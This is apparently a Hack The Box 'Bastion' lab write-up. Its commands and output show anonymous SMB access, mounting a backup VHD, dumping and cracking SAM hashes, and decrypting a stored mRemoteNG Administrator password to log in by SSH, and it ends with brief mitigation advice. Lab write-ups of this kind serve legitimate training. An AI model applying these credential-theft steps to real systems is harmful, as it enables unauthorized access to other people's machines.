# Bastion

```
kali@kali:~/htb/Bastion$ sudo nmap -p- -sV -sC 10.129.107.73 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 02:37 EST
Nmap scan report for 10.129.107.73
Host is up (0.033s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m26s, deviation: 34m37s, median: 32s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-03T08:39:53+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-03T07:39:52
|_  start_date: 2021-03-03T07:33:55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.45 seconds
```

So I enumerate the smb protocol a bit:

```
kali@kali:~/htb/Bastion$ sudo smbclient -L 10.129.107.73 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.107.73 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
kali@kali:~/htb/Bastion$ sudo smbclient  //10.129.107.73/Backups -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 06:02:11 2019
  ..                                  D        0  Tue Apr 16 06:02:11 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019

                7735807 blocks of size 4096. 2758935 blocks available

```

I download the text file with `get note.txt`

And see that it contains:

```
kali@kali:~/htb/Bastion$ cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

Diving deeper into the directories, I find a decent number of files. So in order to browse them easier, I decide to mount the smb server.

```
kali@kali:~/htb/Bastion$ sudo mount -t cifs //10.129.107.73/Backups /mnt/smb
Password for root@//10.129.107.73/Backups:  
kali@kali:~/htb/Bastion$ ls /mnt/smb
note.txt  SDT65CB.tmp  WindowsImageBackup
[...]
[...]
[...]
kali@kali:/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351$ ls -la
total 5330572
drwxr-xr-x 2 root root       8192 Feb 22  2019 .
drwxr-xr-x 2 root root       4096 Feb 22  2019 ..
-rwxr-xr-x 1 root root   37761024 Feb 22  2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root 5418299392 Feb 22  2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root       1186 Feb 22  2019 BackupSpecs.xml
-rwxr-xr-x 1 root root       1078 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
-rwxr-xr-x 1 root root       8930 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
-rwxr-xr-x 1 root root       6542 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
-rwxr-xr-x 1 root root       2894 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
-rwxr-xr-x 1 root root       1488 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
-rwxr-xr-x 1 root root       1484 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
-rwxr-xr-x 1 root root       3844 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
-rwxr-xr-x 1 root root       3988 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
-rwxr-xr-x 1 root root       7110 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
-rwxr-xr-x 1 root root    2374620 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
kali@kali:/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351$ file 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd 
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd: Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1.1 (W2k) Fri Feb 22 12:44:00 2019, 104970240 bytes, CHS 1005/12/17, State 0x1


```

I check all other files for information. But I can't find anything. So I'm pretty sure I have to use these vhd files.

So I google around the best way to mount them, and I find a couple different tools.

```
kali@kali:~/htb/Bastion$ sudo vhdimount -X allow_root /mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd /mnt/vhd/
vhdimount 20201204

kali@kali:~/htb/Bastion$ sudo mmls -aB /mnt/vhd/vhdi1
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Size    Description
002:  000:000   0000000128   0031248511   0031248384   0014G   NTFS / exFAT (0x07)
kali@kali:~/htb/Bastion$ echo 128*512 | bc
65536
kali@kali:~/htb/Bastion$ sudo file /mnt/vhd/vhdi1
/mnt/vhd/vhdi1: DOS/MBR boot sector MS-MBR Vista english at offset 0x162 "Invalid partition table" at offset 0x17a "Error loading operating system" at offset 0x199 "Missing operating system"; partition 1 : ID=0x7, start-CHS (0x41,0,17), end-CHS (0x14,1,2), startsector 128, 31248384 sectors
kali@kali:~/htb/Bastion$ sudo mount -vt ntfs-3g -o ro,noload,offset=65536 /mnt/vhd/vhdi1 /media/vhd/
kali@kali:~/htb/Bastion$ ls /media/vhd
'$Recycle.Bin'   config.sys                pagefile.sys   ProgramData      Recovery                     Users
 autoexec.bat   'Documents and Settings'   PerfLogs      'Program Files'  'System Volume Information'   Windows
kali@kali:~/htb/Bastion$ 
```

I was hoping the flags were here, but alas. So I head over to the SAM files to see if I can get some creds:

```
kali@kali:/media/vhd/Windows/System32/config$ samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
kali@kali:/media/vhd/Windows/System32/config$ 
```

I save the hashes and run john on it:

```
kali@kali:~/htb/Bastion$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=NT
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (*disabled* Administrator)
bureaulampje     (L4mpje)
2g 0:00:00:00 DONE (2021-03-03 04:37) 2.666g/s 12527Kp/s 12527Kc/s 12533KC/s burg772v..burdy1
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
kali@kali:~/htb/Bastion$ 
```


I ssh into the machine with these creds:

```
kali@kali:~/htb/Bastion$ ssh L4mpje@10.129.107.73
L4mpje@10.129.107.73's password: 
X11 forwarding request failed on channel 0
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

l4mpje@BASTION C:\Users\L4mpje>whoami                                                                                           
bastion\l4mpje                                                                                                                  
l4mpje@BASTION C:\Users\L4mpje\Downloads>whoami /priv                                                                                                       
                                                                                                                                                            
PRIVILEGES INFORMATION                                                                                                                                      
----------------------                                                                                                                                      
                                                                                                                                                            
Privilege Name                Description                    State                                                                                          
============================= ============================== =======                                                                                        
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                        
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled                                                                                        
                                                                                                                                                            
l4mpje@BASTION C:\Users\L4mpje\Downloads>        
```

I upload winPEAS.exe with smbserver, but it doesn't find anything eyecatching.

So I start looking at the program files:

```
l4mpje@BASTION C:\>cd "Program Files (x86)"                                                                                     

l4mpje@BASTION C:\Program Files (x86)>dir                                                                                       
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 0CB3-C487                                                                                              

 Directory of C:\Program Files (x86)                                                                                            

22-02-2019  14:01    <DIR>          .                                                                                           
22-02-2019  14:01    <DIR>          ..                                                                                          
16-07-2016  14:23    <DIR>          Common Files                                                                                
23-02-2019  09:38    <DIR>          Internet Explorer                                                                           
16-07-2016  14:23    <DIR>          Microsoft.NET                                                                               
22-02-2019  14:01    <DIR>          mRemoteNG                                                                                   
23-02-2019  10:22    <DIR>          Windows Defender                                                                            
23-02-2019  09:38    <DIR>          Windows Mail                                                                                
23-02-2019  10:22    <DIR>          Windows Media Player                                                                        
16-07-2016  14:23    <DIR>          Windows Multimedia Platform                                                                 
16-07-2016  14:23    <DIR>          Windows NT                                                                                  
23-02-2019  10:22    <DIR>          Windows Photo Viewer                                                                        
16-07-2016  14:23    <DIR>          Windows Portable Devices                                                                    
16-07-2016  14:23    <DIR>          WindowsPowerShell                                                                           
               0 File(s)              0 bytes                                                                                   
              14 Dir(s)  11.300.716.544 bytes free                                                                              

l4mpje@BASTION C:\Program Files (x86)>    
```

mRemoteNG is interesting, let's see if we can find some version info.

```
l4mpje@BASTION C:\Program Files (x86)\mRemoteNG>more Changelog.txt                                                              
1.76.11 (2018-10-18):                                                                                                           

Fixes:                                                                                                                          
------                                                                                                                          
#1139: Feature "Reconnect to previously opened sessions" not working                                                            
#1136: Putty window not maximized                                                                                               


1.76.10 (2018-10-07):                                                                                                           

Fixes:                                                                                                                          
------                                                                                                                          
#1124: Enabling themes causes an exception                                                                                      


1.76.9 (2018-10-07):                                                                                                            

Fixes:                                                                                                                          
------                                                                                                                          
#1117: Duplicate panel created when "Reconnect on Startup" and "Create Empty Panel" settings enabled                            
#1115: Exception when changing from xml data storage to SQL                                                                     
#1110: Pressing Delete button during connection rename attempts to delete the connection instead of the text                    
#1106: Inheritance does not work when parent has C# default type set                                                            
#1092: Invalid Cast Exceptions loading default connectioninfo                                                                   
#1091: Minor themeing issues                                                                                                    
#853: Added some additional safety checks and logging to help address RDP crashes                                               


1.76.8 (2018-08-25):                                                                                                            

Fixes:                                                                                                                          
------                                                                                                                          
#1088: Delete and Launch buttons are not disabled when last external tool deleted                                               
#1087: 'Save connections after every edit' setting not honored                                                                  
#1082: Connections not given GUID if Id is empty in connection xml                                                              


1.76.7 (2018-08-22):                                                                                                            

Fixes:                                                                                                                          
------                                                                                                                          
#1076: Wrong object selected when duplicating connection then switching between properties and inheritance in config window     
#1068: Fixed some toolbar positioning bugs                                                                                      


-- More (1%) --  
```


I check the changelog and see that we are running version 1.76.11

Searchsploit does not find anything, but googling mRemoteNG exploit gives us a decrypt stored passwords exploit- https://github.com/haseebT/mRemoteNG-Decrypt 

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                                                                  
<?xml version="1.0" encoding="utf-8"?>                                                                                                                      
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC                            
M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0                            
oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                                                                                                                  
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna                            
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
[...]
[...]
[...]
```


So we see the password.


```
kali@kali:~/htb/Bastion$ python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
kali@kali:~/htb/Bastion$ ssh Administrator@10.129.107.73                                                                                              
Administrator@10.129.107.73's password: 
X11 forwarding request failed on channel 0
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

administrator@BASTION C:\Users\Administrator>whoami                                                                             
bastion\administrator                                                                                                            
```

## Comparing myself to the official writeup:

The official writeup uses a windows VM to connect to the smb share, this allows them to open the VHD file directly in 7-zip.

After they got the SAM hash they cracked it with hashkiller.

They download the confCons.xml file with SCP and then import it to mRemoteNG. They then create a new external tool which echoes the password.

## How to stop this exploit:

A user connecting with no username and password should not have access to any real information on the smb share.

I'm not quite sure why they needed the backup drive. But I'm sure any backup information could be kept in a safer place.

mRemoteNG is only currently developed and kept up by 2 people. https://www.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/

I don't know how secure the latest version of mRemoteNG is, so if you wish to use it please do some reasearch on how to secure it properly.

